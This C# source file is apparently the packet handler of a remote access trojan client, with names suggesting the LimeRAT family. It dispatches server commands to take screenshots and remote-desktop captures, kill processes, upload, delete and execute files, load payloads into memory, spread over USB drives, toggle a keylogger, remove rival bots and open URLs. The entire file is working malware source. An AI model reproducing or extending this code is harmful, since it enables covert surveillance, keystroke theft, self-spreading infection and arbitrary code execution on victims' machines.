using Client.MessagePack;
using Client.Sockets;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace Client.Handle_Packet
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "sendMessage":
                        {
                            MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
                        }
                        break;

                    case "Ping":
                        {
                            Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
                        }
                        break;


                    case "thumbnails":
                        {
                            new HandleGetScreenShot();
                        }
                        break;

                    case "sendFile":
                        {
                            Received();
                            new HandleSendTo().SendToDisk(unpack_msgpack);
                        }
                        break;

                    case "sendMemory":
                        {
                            Received();
                            new HandleSendTo().SendToMemory(unpack_msgpack);
                        }
                        break;

                    case "close":
                        {
                            try
                            {
                                ClientSocket.Client.Shutdown(SocketShutdown.Both);
                                ClientSocket.Client.Dispose();
                            }
                            catch { }
                            Environment.Exit(0);
                        }
                        break;

                    case "restart":
                        {
                            try
                            {
                                ClientSocket.Client.Shutdown(SocketShutdown.Both);
                                ClientSocket.Client.Dispose();
                            }
                            catch { }
                            Process.Start(Application.ExecutablePath);
                            Environment.Exit(0);
                        }
                        break;

                    case "uninstall":
                        {
                            new HandleUninstall();
                        }
                        break;

                    case "usbSpread":
                        {
                            HandleLimeUSB limeUSB = new HandleLimeUSB();
                            limeUSB.Run();
                            break;
                        }

                    case "remoteDesktop":
                        {
                        //    switch (unpack_msgpack.ForcePathObject("Option").AsString)
                            //{
                                //case "true":
                                 //   {
                                        HandleRemoteDesktop remoteDesktop = new HandleRemoteDesktop();
                                        remoteDesktop.CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger));
                                        break;
                                  //  }
                            }
                           // break;
                     //   }

                    case "processManager":
                        {
                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
                            {
                                case "List":
                                    {
                                        new HandleProcessManager().ProcessList();
                                        break;
                                    }

                                case "Kill":
                                    {
                                        new HandleProcessManager().ProcessKill(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                                        break;
                                    }
                            }
                        }
                        break;

                    case "fileManager":
                        {
                            switch (unpack_msgpack.ForcePathObject("Command").AsString)
                            {
                                case "getDrivers":
                                    {
                                        FileManager fileManager = new FileManager();
                                        fileManager.GetDrivers();
                                        break;
                                    }

                                case "getPath":
                                    {
                                        FileManager fileManager = new FileManager();
                                        fileManager.GetPath(unpack_msgpack.ForcePathObject("Path").AsString);
                                        break;
                                    }

                                case "uploadFile":
                                    {
                                        string fullPath = unpack_msgpack.ForcePathObject("Name").AsString;
                                        if (File.Exists(fullPath))
                                        {
                                            File.Delete(fullPath);
                                            Thread.Sleep(500);
                                        }
                                        unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
                                        break;
                                    }

                                case "deleteFile":
                                    {
                                        string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                                        File.Delete(fullPath);
                                        break;
                                    }

                                case "execute":
                                    {
                                        string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                                        Process.Start(fullPath);
                                        break;
                                    }
                            }
                        }
                        break;

                    case "socketDownload":
                        {
                            FileManager fileManager = new FileManager();
                            string file = unpack_msgpack.ForcePathObject("File").AsString;
                            string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
                            fileManager.DownnloadFile(file, dwid);
                            break;
                        }

                    case "botKiller":
                        {
                            HandleBotKiller botKiller = new HandleBotKiller();
                            botKiller.RunBotKiller();
                            break;
                        }

                    case "keyLogger":
                        {
                            FileManager fileManager = new FileManager();
                            string isON = unpack_msgpack.ForcePathObject("isON").AsString;
                            if (isON == "true")
                            {
                                new Thread(() =>
                                {
                                    HandleLimeLogger.isON = true;
                                    HandleLimeLogger.Run();
                                }).Start();
                            }
                            else
                            {
                                HandleLimeLogger.isON = false;
                            }
                            break;
                        }

                    case "visitURL":
                        {
                            string url = unpack_msgpack.ForcePathObject("URL").AsString;
                            if (url.StartsWith("http"))
                            {
                                Process.Start(url);
                            }
                            break;
                        }
                }
            }
            catch { }
        }

        private static void Received()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Received";
            ClientSocket.BeginSend(msgpack.Encode2Bytes());
        }

    }
}
